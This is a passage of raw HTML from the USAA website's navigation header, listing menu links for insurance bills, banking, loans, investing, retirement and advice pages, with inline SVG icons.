.83.37.83.83v15.83l-2.5-1.25-1.66 1.25L10 17.08l-1.67 1.25-1.66-1.25-2.5 1.25V2.5c0-.46.37-.83.83-.83h10zm-.83 1.66H5.83v12.09l.84-.42 1.66 1.25L10 15l1.67 1.25L13.33 15l.84.42V3.33zm-5 8.34a.83.83 0 110 1.66h-.84a.83.83 0 110-1.66h.84zm2.5-3.34a.83.83 0 010 1.67H8.33a.83.83 0 110-1.67h3.34zm0-3.33a.83.83 0 110 1.67H8.33a.83.83 0 010-1.67h3.34z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Auto and Property Insurance Bill</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/ent_multipay/CpBillPay?action=INIT&amp;wa_ref=pub_global_insurance_life_other_bills"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M15 1.67c.46 0 .83.37.83.83v15.83l-2.5-1.25-1.66 1.25L10 17.08l-1.67 1.25-1.66-1.25-2.5 1.25V2.5c0-.46.37-.83.83-.83h10zm-.83 1.66H5.83v12.09l.84-.42 1.66 1.25L10 15l1.67 1.25L13.33 15l.84.42V3.33zm-5 8.34a.83.83 0 110 1.66h-.84a.83.83 0 110-1.66h.84zm2.5-3.34a.83.83 0 010 1.67H8.33a.83.83 0 110-1.67h3.34zm0-3.33a.83.83 0 110 1.67H8.33a.83.83 0 010-1.67h3.34z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Life Insurance and Other Bills</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/manage-my-insurance?wa_ref=pub_global_insurance_manage_insurance"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M10.83 2.5v4.17H15v10c0 .46-.37.83-.83.83H5.83a.83.83 0 01-.83-.83V3.33c0-.46.37-.83.83-.83h5zm-.41 11.67H7.84l-.07.02a.42.42 0 00-.06.75l.06.03.07.02.08.01h2.57l.07-.03a.42.42 0 00-.07-.8h-.07zm1.66-2.5H7.84l-.07.02a.42.42 0 00-.06.75l.06.03.07.02.08.01h4.24l.07-.03a.42.42 0 00-.07-.8h-.08zm0-2.5H7.84l-.07.02a.42.42 0 00-.06.75l.06.03.07.02.08.01h4.24l.07-.03a.42.42 0 00-.07-.8h-.08zm-.41-6.67L15 5.83h-3.33V2.5z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Manage Insurance</a></strong></li></ul></div></div></div></div></div></div></li><li class="usaa-headerNav-menuItem"><button type="button" class="usaa-headerNav-menuLink" aria-expanded="false">Banking</button><div class="headerDropMenu"><div class="headerDropMenu-content"><div style="" class="menuContent"><div class="usaa-globalNav-container"><div class="menuContent-body"><div class="menuContent-main"><div class="menuContent-row"><div class="menuContent-col menuContent-col3"><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/no_fee_checking_main?wa_ref=pub_global_banking_checking">Checking<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-savings?wa_ref=pub_global_banking_savings">Savings<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/banking_credit_cards_main?wa_ref=pub_global_banking_credit_cards">Credit Cards<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/youth-banking?wa_ref=pub_global_banking_youth_banking">Youth Banking<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-cds?wa_ref=pub_global_banking_cds">Certificates of Deposit (CDs)<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div></div><div class="menuContent-col menuContent-col3"><ul class="menuContent-group"><li><strong><span class="menuContent-item">Loans</span></strong></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-loan-auto-main?wa_ref=pub_global_banking_loans_auto">Auto Loans</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-loan-personal?wa_ref=pub_global_banking_loans_personal">Personal Loans</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank_loan_rv_main?wa_ref=pub_global_banking_loans_rv">RV Loans</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank_loan_boat_main?wa_ref=pub_global_banking_loans_boat">Boat Loans</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-loan-motorcycle?wa_ref=pub_global_banking_loans_motorcycle">Motorcycle Loans</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank_loan_leisure_vehicle_main?wa_ref=pub_global_banking_loans_leisure_vehicle">Leisure Vehicle Loans</a></li></ul></div><div class="menuContent-col menuContent-col3"><ul class="menuContent-group"><li><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-real-estate-mortgage-loans?wa_ref=pub_global_banking_home_mortgages">Home Mortgages<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-real-estate-mortgage-loans?wa_ref=pub_global_banking_home_mortgages_mortgages_main">Mortgages</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-real-estate-mortgage-rates?wa_ref=pub_global_banking_home_mortgages_rates">Mortgage Rates</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-real-estate-refinance-mortgage?wa_ref=pub_global_banking_home_mortgages_refinance">Refinance</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/bank-real-estate-va-loan?wa_ref=pub_global_banking_home_mortgages_va_loan">VA Loan</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/re-home-loan-assistance?wa_ref=pub_global_banking_home_mortgages_assistance_options">Mortgage Payment Assistance Options</a></li></ul></div></div><div class="menuContent-footer"><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/banking?wa_ref=pub_global_banking"><span>View All Banking</span><svg width="20" height="20" focusable="false"><g fill="none" fill-rule="evenodd"><path d="M0 0h20v20H0z"></path><path fill="#0b2237" d="M7.5 4l6.5 6.5L7.5 17 6 15.5l5-5-5-5z"></path></g></svg></a></strong></div></div><div class="menuContent-aside"><ul class="menuContent-group"><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/ent_locationServices/UsaaLocator/?taskCode=ATM&amp;wa_ref=pub_global_banking_find_atm"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M10 1.67c3.22 0 6.25 2.5 5.83 6.66-.27 2.78-2.22 6.11-5.83 10-3.61-3.89-5.56-7.22-5.83-10A5.79 5.79 0 0110 1.67zm0 2.5a3.33 3.33 0 100 6.66 3.33 3.33 0 000-6.66z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Find ATM</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/faq_BankWS_ABATransit_Routing_Number_BankFaqL1_index?wa_ref=pub_global_banking_bank_routing_number"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M17.5 4.17c.46 0 .83.37.83.83v10c0 .46-.37.83-.83.83h-15a.83.83 0 01-.83-.83V5c0-.46.37-.83.83-.83h15zm-.83 3.33H3.33v6.67h13.34V7.5zm-2.5 3.33a.83.83 0 010 1.67h-5a.83.83 0 110-1.67h5z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Bank Routing Number</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/online-transfers?wa_ref=pub_global_banking_transfer_funds"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M18.33 12.5V4.17H5V2.6a.42.42 0 00-.66-.26l-.05.04L1.67 5l2.62 2.62.06.05c.14.1.33.1.47 0l.06-.05.04-.05.03-.05A.42.42 0 005 7.39L5 7.33v-1.5h9.17l2.5 2.5v2.5l1.66 1.67zm-2.91 5.24c.09 0 .17-.02.24-.08l.05-.04L18.33 15l-2.62-2.62-.06-.05a.42.42 0 00-.47 0l-.06.05-.04.05-.03.05a.42.42 0 00-.04.13l-.01.06v1.5H5.83l-2.5-2.5v-2.5L1.67 7.5v8.33H15v1.57c.04.2.21.34.42.34zM10 12.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Transfer Funds</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/wire_transfer_instructions?wa_ref=pub_global_banking_wire_transfers"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath fill='%230b2237' d='M15 12.4h.1c.2-.2.4-.2.6 0l2.6 2.6-2.6 2.6a.4.4 0 0 1-.7-.2v-1.6h-4.2v-1.6H15v-1.8h.1zm3.3-8.2v6.6h-1.6V8.3l-2.5-2.5H5.8L3.3 8.3v3.4l2.5 2.5h3.4v1.6H1.7V4.2zM10 7.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5z'/%3E%3C/g%3E%3C/svg%3E" alt="">Wire Transfers</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/online-account-deposits?wa_ref=pub_global_banking_pay_bills"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M15.83 2.5c.92 0 1.67.75 1.67 1.67v11.66c0 .92-.75 1.67-1.67 1.67H4.17c-.92 0-1.67-.75-1.67-1.67V4.17c0-.92.75-1.67 1.67-1.67h11.66zm0 5H4.17v8.33h11.66V7.5zm-8.33 5v1.67H5.83V12.5H7.5zm3.33 0v1.67H9.17V12.5h1.66zm3.34 0v1.67H12.5V12.5h1.67zM7.5 9.17v1.66H5.83V9.17H7.5zm3.33 0v1.66H9.17V9.17h1.66zm3.34 0v1.66H12.5V9.17h1.67z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Pay Bills</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/ent_edde/ViewMyDocuments?wa_ref=pub_global_banking_documents_statements"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M10.83 2.5v4.17H15v10c0 .46-.37.83-.83.83H5.83a.83.83 0 01-.83-.83V3.33c0-.46.37-.83.83-.83h5zm-.41 11.67H7.84l-.07.02a.42.42 0 00-.06.75l.06.03.07.02.08.01h2.57l.07-.03a.42.42 0 00-.07-.8h-.07zm1.66-2.5H7.84l-.07.02a.42.42 0 00-.06.75l.06.03.07.02.08.01h4.24l.07-.03a.42.42 0 00-.07-.8h-.08zm0-2.5H7.84l-.07.02a.42.42 0 00-.06.75l.06.03.07.02.08.01h4.24l.07-.03a.42.42 0 00-.07-.8h-.08zm-.41-6.67L15 5.83h-3.33V2.5z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Documents and Statements</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/money_manager_landing_main?wa_ref=pub_global_banking_budget_spending"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath fill='%230B2237' d='M18.33 4.17v11.66H1.67V4.17h16.66Zm-4.16 1.66H5.83l-2.5 2.5v3.34l2.5 2.5h8.34l2.5-2.5V8.33l-2.5-2.5ZM10 7.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5Z'/%3E%3C/g%3E%3C/svg%3E" alt="">Budget and Spending</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/atms-and-digital-deposits?wa_ref=pub_global_banking_deposit_money"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M3.33 12.5v2.08c0 .23.19.42.42.42h2.08v1.67h-2.5c-.92 0-1.66-.75-1.66-1.67v-2.5h1.66zm15 0V15c0 .92-.74 1.67-1.66 1.67h-2.5V15h2.08c.23 0 .42-.19.42-.42V12.5h1.66zM14.5 6.67c.28 0 .5.21.5.47v5.72c0 .26-.22.47-.5.47h-9a.49.49 0 01-.5-.47V7.14c0-.26.22-.47.5-.47h9zm-3.25 4.16H7.08a.42.42 0 00-.07.83h4.24a.42.42 0 00.07-.82h-.07zM9.58 9.17h-2.5a.42.42 0 00-.07.82l.07.01h2.5a.42.42 0 00.08-.83h-.08zM5.83 3.33V5H3.75a.42.42 0 00-.42.42V7.5H1.67V5c0-.92.74-1.67 1.66-1.67h2.5zm10.84 0c.92 0 1.66.75 1.66 1.67v2.5h-1.66V5.42a.42.42 0 00-.42-.42h-2.08V3.33h2.5z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Deposit Money</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/mobile_banking_send_money_main?wa_ref=pub_global_banking_send_money_with_zelle"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M11.67 2.08v1.25h4.16v2.25c0 .45-.17.87-.48 1.18l-6.58 6.57H15c.46 0 .83.38.83.84v1.66c0 .46-.37.84-.83.84h-3.33v1.25c0 .23-.19.41-.42.41H9.58a.42.42 0 01-.41-.41v-1.25h-5v-2.75c0-.45.17-.87.48-1.18l6.08-6.07H5a.83.83 0 01-.83-.84V4.17c0-.46.37-.84.83-.84h4.17V2.08c0-.23.18-.41.41-.41h1.67c.23 0 .42.18.42.41z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Send Money with Zelle®</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/banking-service?wa_ref=pub_global_banking_account_services"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M12.5 9.17v5h1.67v-5H12.5zM10 4.32L4.17 6.67v.83h11.66v-.83L10 4.32zm-.83 4.85v5h1.66v-5H9.17zm-3.34 0v5H7.5v-5H5.83zm10 5h.84v1.66h.83v1.67h-15v-1.67h.83v-1.66h.84v-5H2.5V5.83L10 2.5l7.5 3.33v3.34h-1.67v5z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Account Services</a></strong></li></ul></div></div></div></div></div></div></li><li class="usaa-headerNav-menuItem"><button type="button" class="usaa-headerNav-menuLink" aria-expanded="false">Investing</button><div class="headerDropMenu"><div class="headerDropMenu-content"><div style="" class="menuContent"><div class="usaa-globalNav-container"><div class="menuContent-body"><div class="menuContent-main"><div class="menuContent-row"><div class="menuContent-col menuContent-col2"><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-brokerage?wa_ref=pub_global_investing_brokerage_trading" aria-describedby="gtId-16"><span>Brokerage and Trading</span></a><p class="menuContent-subText" id="gtId-16">Invest in what works for you, like stocks, bonds, mutual funds, options and ETFs.</p></div></strong></div><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-mutual-funds-etfs?wa_ref=pub_global_investing_mutual_funds" aria-describedby="gtId-17"><span>Mutual Funds</span></a><p class="menuContent-subText" id="gtId-17">Access professionally managed, diversified portfolios.</p></div></strong></div><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-ira?wa_ref=pub_global_investing_iras_rollovers" aria-describedby="gtId-18"><span>IRAs and Rollovers</span></a><p class="menuContent-subText" id="gtId-18">Get tax advantages by saving with an individual retirement account.</p></div></strong></div></div><div class="menuContent-col menuContent-col2"><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-529-college-savings-plan?wa_ref=pub_global_investing_529_education_plans" aria-describedby="gtId-19"><span>529 Education Plans</span></a><p class="menuContent-subText" id="gtId-19">Save for education costs with a 529 Education Savings Plan.</p></div></strong></div><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-automated?wa_ref=pub_global_investing_automated" aria-describedby="gtId-20"><span>Automated Investing</span></a><p class="menuContent-subText" id="gtId-20">Build and balance your portfolio automatically.</p></div></strong></div><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-advisor?wa_ref=pub_global_investing_financial_planning" aria-describedby="gtId-21"><span>Financial Planning</span></a><p class="menuContent-subText" id="gtId-21">Receive helpful guidance as you work toward your investing goals.</p></div></strong></div></div></div><div class="menuContent-footer"><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/inet/wc/investments?wa_ref=pub_global_investing"><span>View All Investing</span><svg width="20" height="20" focusable="false"><g fill="none" fill-rule="evenodd"><path d="M0 0h20v20H0z"></path><path fill="#0b2237" d="M7.5 4l6.5 6.5L7.5 17 6 15.5l5-5-5-5z"></path></g></svg></a></strong></div></div><div class="menuContent-aside"><ul class="menuContent-group"><li><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/investments-principles?wa_ref=pub_global_investing_investing_basics"><img alt="">Investing Basics</a></strong></li></ul></div></div></div></div></div></div></li><li class="usaa-headerNav-menuItem"><button type="button" class="usaa-headerNav-menuLink" aria-expanded="false">Retirement</button><div class="headerDropMenu"><div class="headerDropMenu-content"><div style="" class="menuContent"><div class="usaa-globalNav-container"><div class="menuContent-body"><div class="menuContent-main"><div class="menuContent-row"><div class="menuContent-col menuContent-col2"><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/investments-ira?wa_ref=pub_global_retirement_iras_rollovers" aria-describedby="gtId-22"><span>IRAs and Rollovers</span></a><p class="menuContent-subText" id="gtId-22">Get tax advantages by saving with an individual retirement account.</p></div></strong></div><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/insurance_annuities_main?wa_ref=pub_global_retirement_annuities" aria-describedby="gtId-23"><span>Annuities</span></a><p class="menuContent-subText" id="gtId-23">Grow and protect your retirement savings with an annuity.</p></div></strong></div></div><div class="menuContent-col menuContent-col2"><div class="menuContent-group"><strong><div class="menuContent-itemWithSubText"><a href="https://www.usaa.com/inet/wc/long_term_care_insurance_main?wa_ref=pub_global_retirement_long_term_care" aria-describedby="gtId-24"><span>Long-Term Care</span></a><p class="menuContent-subText" id="gtId-24">Prepare for a time when you may need assistance.</p></div></strong></div></div></div></div><div class="menuContent-aside"><ul class="menuContent-group"><li><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/retirement-income?wa_ref=pub_global_retirement_retirement_income"><img alt="">Retirement Income</a></strong></li><li><strong><a class="menuContent-item" href="https://www.usaa.com/inet/ent_rmd_calculator/EntRmd/RMD?wa_ref=pub_global_retirement_rmd_calculator"><img alt="">Required Minimum Distribution (RMD) Calculator</a></strong></li></ul></div></div></div></div></div></div></li><li class="usaa-headerNav-menuItem"><button type="button" class="usaa-headerNav-menuLink" aria-expanded="false">Advice</button><div class="headerDropMenu"><div class="headerDropMenu-content"><div class="menuContent"><div class="usaa-globalNav-container"><div class="menuContent-body"><div class="menuContent-main"><div class="menuContent-row"><div class="menuContent-col menuContent-col3"><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-auto?wa_ref=pub_global_advice_auto">Auto<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-home?wa_ref=pub_global_advice_home">Home<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-insurance-life-health?wa_ref=pub_global_advice_life_health">Life and Health<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-retirement?wa_ref=pub_global_advice_retirement">Retirement<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-finances?wa_ref=pub_global_advice_finances">Finances<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div><div class="menuContent-group"><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-disasters?wa_ref=pub_global_advice_disasters">Disasters<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></div></div><div class="menuContent-col menuContent-col3"><ul class="menuContent-group"><li><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-military-life?wa_ref=pub_global_advice_military">Military Life<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-military-joining-the-military?wa_ref=pub_global_advice_military_joining">Joining the Military</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-military-deployment?wa_ref=pub_global_advice_military_deployment">Deployment</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-military-move-pcs?wa_ref=pub_global_advice_military_pcs">Military Move (PCS)</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-military-leaving-the-military?wa_ref=pub_global_advice_military_leaving">Leaving the Military</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-military-military-spouse?wa_ref=pub_global_advice_military_spouses">Military Spouses</a></li></ul></div><div class="menuContent-col menuContent-col3"><ul class="menuContent-group"><li><strong><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice-family?wa_ref=pub_global_advice_family">Family<span class="usaa-globalNav-screenReader"> (Main)</span></a></strong></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice_family_getting_married_menu?wa_ref=pub_global_advice_family_marriage">Marriage</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice_family_becoming_a_parent_menu?wa_ref=pub_global_advice_family_becoming_parent">Becoming a Parent</a></li><li><a class="menuContent-item" href="https://www.usaa.com/inet/wc/advice_family_getting_divorced_menu?wa_ref=pub_global_advice_family_divorce">Divorce</a></li><li><a class="menuContent-item" href="https://www.usaa.com/my/survivorship/?wa_ref=pub_global_advice_family_loss_loved_one">Loss of a Loved One</a></li></ul></div></div><div class="menuContent-footer"><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/advice/advice-center/?wa_ref=pub_global_advice"><span>View All Advice</span><svg width="20" height="20" focusable="false"><g fill="none" fill-rule="evenodd"><path d="M0 0h20v20H0z"></path><path fill="#0b2237" d="M7.5 4l6.5 6.5L7.5 17 6 15.5l5-5-5-5z"></path></g></svg></a></strong></div></div><div class="menuContent-aside"><ul class="menuContent-group"><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/advice/financial-readiness-score/?wa_ref=pub_global_advice_financial_readiness_assessment"><img src="data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath d='M0 0h20v20H0z'/%3E%3Cpath d='M17 14v1.5L15.5 17 14 15.5V14h3zM15.5 3c.83 0 1.5.67 1.5 1.5V6h-3V4.5c0-.83.67-1.5 1.5-1.5zM14 7h3v6h-3V7zM8 3v4h4v9.22c0 .43-.34.78-.75.78h-7.5a.76.76 0 01-.75-.78V3.78c0-.43.34-.78.75-.78H8zm-.28 10.78h-2.4a.39.39 0 00-.07.75l.07.02H7.79a.39.39 0 00-.07-.77zm1.56-2.28H5.32a.39.39 0 00-.07.75l.07.02h4.03a.39.39 0 00-.07-.77zm0-2.28H5.32a.39.39 0 00-.07.76l.07.01.07.01h3.96a.39.39 0 00-.07-.78zM9 3l3 3H9V3z' fill='%230B2237'/%3E%3C/g%3E%3C/svg%3E" alt="">Financial Readiness Assessment</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/advice/military-pay-calculator/?wa_ref=pub_global_advice_military_pay_calculator"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='20' height='20'%3E%3Cdefs%3E%3Cpath id='reuse-0' d='M0 0h20v20H0z'/%3E%3C/defs%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cuse xlink:href='%23reuse-0'/%3E%3Cpath fill='%230b2237' d='M14.17 2.5c.92 0 1.66.75 1.66 1.67v11.66c0 .92-.74 1.67-1.66 1.67H5.83c-.92 0-1.66-.75-1.66-1.67V4.17c0-.92.74-1.67 1.66-1.67zM7.08 13.33h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm3.34 0h-.84a.42.42 0 0 0-.41.42v.83c0 .23.18.42.41.42h.84c.23 0 .41-.19.41-.42v-.83a.42.42 0 0 0-.41-.42zm3.33 0h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zM7.08 10h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm3.34 0h-.84a.42.42 0 0 0-.41.42v.83c0 .23.18.42.41.42h.84c.23 0 .41-.19.41-.42v-.83a.42.42 0 0 0-.41-.42zm3.33 0h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm0-5h-7.5a.42.42 0 0 0-.42.42v2.5c0 .23.19.41.42.41h7.5c.23 0 .42-.18.42-.41v-2.5a.42.42 0 0 0-.42-.42z'/%3E%3Cuse xlink:href='%23reuse-0'/%3E%3C/g%3E%3C/svg%3E" alt="">Military Pay Calculator</a></strong></li><li><strong><a class="menuContent-item menuContent-item--withIcon" href="https://www.usaa.com/advice/deployment-pay-calculator/?wa_ref=pub_global_advice_deployment_pay_calculator"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='20' height='20'%3E%3Cdefs%3E%3Cpath id='reuse-0' d='M0 0h20v20H0z'/%3E%3C/defs%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cuse xlink:href='%23reuse-0'/%3E%3Cpath fill='%230b2237' d='M14.17 2.5c.92 0 1.66.75 1.66 1.67v11.66c0 .92-.74 1.67-1.66 1.67H5.83c-.92 0-1.66-.75-1.66-1.67V4.17c0-.92.74-1.67 1.66-1.67zM7.08 13.33h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm3.34 0h-.84a.42.42 0 0 0-.41.42v.83c0 .23.18.42.41.42h.84c.23 0 .41-.19.41-.42v-.83a.42.42 0 0 0-.41-.42zm3.33 0h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zM7.08 10h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 .42-.19.42-.42v-.83a.42.42 0 0 0-.42-.42zm3.34 0h-.84a.42.42 0 0 0-.41.42v.83c0 .23.18.42.41.42h.84c.23 0 .41-.19.41-.42v-.83a.42.42 0 0 0-.41-.42zm3.33 0h-.83a.42.42 0 0 0-.42.42v.83c0 .23.19.42.42.42h.83c.23 0 